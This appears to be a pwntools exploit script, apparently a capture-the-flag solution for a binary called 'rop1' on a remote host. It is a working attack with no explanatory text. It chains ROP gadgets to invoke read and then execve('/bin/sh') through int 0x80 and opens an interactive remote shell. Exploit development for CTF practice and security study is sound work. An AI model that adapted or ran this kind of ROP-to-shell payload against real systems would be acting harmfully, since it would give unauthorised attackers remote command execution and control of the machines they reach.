from pwn import *

if __name__ == '__main__':
#	s = process('./rop1')
	s = remote('cykor.kr', 10009)

	gadget1 = 0x080480d8
#   0x080480d8 <+0>:	rep stos BYTE PTR es:[edi],al
#   0x080480da <+2>:	ret 
	gadget2 = 0x080480db		# pop ret
	write = 0x080480f7
	int80 = 0x80480f4
	read = 0x03
	execve = 0x0b
	space = 0x0804910b

#	log.info('libc_base : ' + hex(libc_base))

	payload = p32(gadget2)
	payload += 'AAAABBBBCCCCDDDD'
	payload += p32(0x0)
	payload += p32(0x100)
	payload += p32(space)
	payload += p32(read)
	payload += p32(int80)
	payload += p32(gadget2)

	payload += p32(0)
	payload += p32(0)
	payload += p32(0)
	payload += p32(0)
        payload += p32(space)
        payload += p32(0)
        payload += p32(0)
        payload += p32(execve)
        payload += p32(int80)
	
	s.sendline(payload)

	pause()

	payload2 = '/bin/sh\0'

	s.sendline(payload2)

	pause()

	s.interactive()
	s.close()
